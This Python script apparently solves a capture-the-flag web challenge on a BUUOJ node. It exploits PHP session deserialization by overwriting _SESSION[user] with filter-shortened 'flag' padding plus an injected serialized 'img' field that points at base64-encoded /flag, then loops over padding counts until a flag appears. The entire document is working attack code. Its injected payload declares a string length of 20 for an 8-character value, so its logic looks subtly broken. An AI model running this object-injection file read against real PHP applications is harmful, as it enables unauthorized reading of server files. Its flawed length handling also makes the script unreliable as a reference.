import requests
import base64
import time
import re

URL = "http://4079c9cb-e2e3-4d7b-9bc1-a686b76e15a2.node5.buuoj.cn:81/"

session = requests.Session()

# According to the writeup:
# inject = '";s:3:"img";s:20:"L2ZsYWc=";}'
# word = "flag"
# n = len(inject) // len(word) + 1  # 29 // 4 + 1 = 8
# user_value = word * n + inject

# Let me try exactly this:
target = "/flag"
target_b64 = base64.b64encode(target.encode()).decode()

inject = '";s:3:"img";s:20:"' + target_b64 + '";}'
word = "flag"
n = len(inject) // len(word) + 1
user_value = word * n + inject

print(f"Inject: {inject}")
print(f"n: {n}")
print(f"User value: {user_value}")
print(f"User value length: {len(user_value)}")

# Send request
data = {"_SESSION[user]": user_value}
r = session.post(URL + "?f=show_image", data=data)

print(f"\nResponse status: {r.status_code}")
print(f"Response headers: {dict(r.headers)}")
print(f"Response text: '{r.text}'")
print(f"Response length: {len(r.text)}")

# Try with different number of 'flag's
print("\n=== Testing different n values ===")
for n in range(5, 20):
    user_value = "flag" * n + inject
    
    data = {"_SESSION[user]": user_value}
    r = session.post(URL + "?f=show_image", data=data)
    
    if r.text:
        print(f"n={n}: '{r.text[:100]}'")
        if "flag{" in r.text.lower():
            print(f"FLAG: {r.text}")
            break
    
    time.sleep(0.2)

